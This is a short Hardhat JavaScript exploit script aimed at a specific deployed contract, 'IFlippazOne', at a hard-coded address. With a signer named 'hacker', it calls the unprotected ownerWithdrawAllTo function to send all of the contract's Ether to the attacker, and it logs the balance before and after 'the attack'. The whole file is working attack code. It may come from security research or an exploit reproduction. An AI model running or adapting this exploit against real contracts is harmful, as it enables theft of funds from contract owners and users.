// 
//  Author [#] Supremacy Inc.
//

const hre = require("hardhat");

async function main() {
  const [hacker] = await ethers.getSigners();

  const flippazOne = await hre.ethers.getContractAt("IFlippazOne", "0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944");

  const before = await ethers.provider.getBalance(hacker.address);

  console.log("[#] 🧛 Ether balance before the attack: ", hre.ethers.utils.formatEther(before.toString()) + " Ether");

  await flippazOne.ownerWithdrawAllTo(hacker.address)
  
  const after = await ethers.provider.getBalance(hacker.address);

  console.log("[#] 🧛 Ether balance after the attack: ", hre.ethers.utils.formatEther(after.toString()) + " Ether");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
